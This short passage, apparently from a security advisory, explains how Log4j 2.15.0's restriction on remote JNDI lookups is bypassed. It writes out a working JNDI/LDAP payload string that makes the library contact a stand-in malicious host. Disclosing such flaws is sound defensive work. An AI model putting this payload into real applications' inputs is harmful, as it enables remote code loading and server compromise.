Due to the fix for CVE-2021-44228 in Log3j 2.15.0, remote JNDI queries are no longer permitted by default.
  
Therefore, this can be worked around using the following as an example:  “${jndi:ldap://127.0.0.1#malicious-server.host/aaa}” Version 2.15.0 of Log4j will view the request as valid due to localhost being present before the “#”; however, the framework will still resolve the entire string and attempt to contact “malicious-server.host” with an LDAP query.
